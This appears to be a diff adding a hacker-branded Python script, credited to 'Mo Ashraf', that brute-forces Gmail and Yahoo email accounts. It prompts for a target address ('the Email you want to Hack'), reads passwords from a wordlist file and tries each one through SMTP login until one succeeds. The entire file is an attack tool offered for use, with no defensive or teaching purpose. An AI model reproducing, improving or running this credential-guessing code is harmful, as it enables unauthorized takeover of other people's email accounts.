@@ -1,0 +1,84 @@
+import smtplib
+import time
+from termcolor import *
+
+print(colored("""
+  ███╗   ███╗██████╗     ███╗   ███╗ ██████╗ 
+  ████╗ ████║██╔══██╗    ████╗ ████║██╔═══██╗
+  ██╔████╔██║██████╔╝    ██╔████╔██║██║   ██║
+  ██║╚██╔╝██║██╔══██╗    ██║╚██╔╝██║██║   ██║
+  ██║ ╚═╝ ██║██║  ██║    ██║ ╚═╝ ██║╚██████╔╝
+  ╚═╝     ╚═╝╚═╝  ╚═╝    ╚═╝     ╚═╝ ╚═════╝ 
+                   Monaliza                        
+                                      
+                                                   
+ ""","red"))
+print(colored("                 ##############################","red"))
+print(colored("                   [√] Codded By Mo Ashraf [√]  ","blue"))
+print(colored("                            ♡MonaliZa♡            ","blue"))
+print(colored("                             FB : logan0x        ","blue"))
+print(colored("                 ##############################","green"))
+Help=colored("\n -----> help : to show this help ","white")
+one=colored("\n -----> 1 : to start the tool ", "white")
+two=colored	("\n -----> 2 : to show information about the tool ","white")
+
+print(colored(" -----> help : to show this help ","white"))
+print(colored(" -----> 1 : to start the tool ", "white"))
+print(colored	(" -----> 2 : to show information about the tool ","white"))
+com=input(colored("===>> : ","green"))
+
+
+def brutgmail():
+    global ghack
+    ghack=input(colored("\nEnter the Email you want to Hack (Examble@gmail) : ","white"))
+    
+    s=smtplib.SMTP("smtp.gmail.com",587)
+    s.ehlo()
+    s.starttls()
+    pwlist=open("/storage/emulated/0/passlist.txt","r")
+    pws=pwlist.readlines(1000000)
+    for ps in pws:	
+        try:
+            time.sleep(1)
+            s.login(ghack,ps)
+            print(colored("[+] Password found","green")+"  >>>  "+ps)
+            break;
+        except:
+            print("[!] Password incorrect: "+ ps)
+    
+    
+def brutyahoo():
+    global yhack
+    yhack=input(colored("\Eenter the Email you want to hack(examble@yahoo) :","green"))
+
+    s=smtplib.SMTP("smtp.mail.yahoo.com",587)
+    s.ehlo()
+    s.starttls()
+    pwlist=open("/storage/emulated/0/passlist.txt","r")
+    pws=pwlist.readlines(1000000)
+    for ps in pws:	
+        try:
+            time.sleep(1)
+            s.login(yhack,ps)
+            print(colored("[+] Password found","green")+"  >>>  "+ ps)
+            break;
+        except:
+            print("[!] Password incorrect: "+ ps)
+    
+
+
+def main():
+    kind=input("\nEnter the kind of mail you want to hack (gmail / yahoo) : ")
+    if kind=="gmail":
+        brutgmail()
+    if kind=="yahoo":
+        brutyahoo()
+
+    
+if com =="1":
+    print(colored ("[√] Starting the tool... ","yellow"))
+    main()
+
+if com== "help":
+    print(Help+one+two)
+    
